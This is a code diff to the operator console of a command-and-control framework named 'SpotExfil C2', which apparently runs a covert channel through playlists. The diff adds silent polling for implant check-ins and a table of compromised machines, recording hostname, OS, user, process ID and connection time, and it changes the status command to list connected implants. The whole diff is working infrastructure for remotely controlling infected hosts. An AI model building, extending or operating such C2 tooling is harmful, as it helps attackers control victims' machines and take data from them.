@@ -54,6 +54,7 @@ class Operator:
         self.key = encryption_key
         self.next_seq = 1
         self.pending_seqs = {}  # seq -> module name
+        self.connected_clients = {}  # client_id -> checkin info
 
     def send_command(self, module: str, args: dict = None) -> int:
         """Queue a command for the implant.
@@ -147,10 +148,20 @@ class Operator:
         )
         print("[*] All C2 playlists cleaned")
 
+    def _check_for_checkins(self):
+        """Silently poll for new implant check-ins."""
+        try:
+            self.poll_result_once()
+        except Exception:
+            pass
+
     def interactive(self):
         """Run the interactive operator console."""
         print("SpotExfil C2 Operator Console")
         print("Type 'help' for available commands.\n")
+
+        # Initial check for any pending checkins
+        self._check_for_checkins()
 
         while True:
             try:
@@ -160,6 +171,8 @@ class Operator:
                 break
 
             if not line:
+                # On empty input (just Enter), check for checkins
+                self._check_for_checkins()
                 continue
 
             parts = line.split(None, 1)
@@ -210,7 +223,7 @@ class Operator:
                 print(f"[!] Unknown command: {cmd}. Type 'help'.")
 
     def _display_checkin(self, result: dict):
-        """Display an implant check-in notification."""
+        """Display an implant check-in notification and track it."""
         data = result.get('data', '{}')
         try:
             info = json.loads(data)
@@ -223,6 +236,13 @@ class Operator:
         timestamp = time.strftime(
             '%Y-%m-%d %H:%M:%S', time.localtime(ts)
         )
+        self.connected_clients[client_id] = {
+            'hostname': hostname,
+            'os': os_info,
+            'connected_at': timestamp,
+            'user': info.get('user', 'unknown'),
+            'pid': info.get('pid', '?'),
+        }
         print(
             f"\n[+] New implant connected!"
             f"\n    client_id : {client_id}"
@@ -250,7 +270,14 @@ class Operator:
         print("---")
 
     def _print_status(self):
-        """Show pending commands."""
+        """Show connected clients and pending commands."""
+        if self.connected_clients:
+            print(f"[*] Connected implants ({len(self.connected_clients)}):")
+            for cid, info in self.connected_clients.items():
+                print(f"  {cid}  {info['hostname']}  "
+                      f"{info['os']}  since {info['connected_at']}")
+        else:
+            print("[*] No implants connected")
         if self.pending_seqs:
             print("[*] Pending commands:")
             for seq_num, module in sorted(self.pending_seqs.items()):
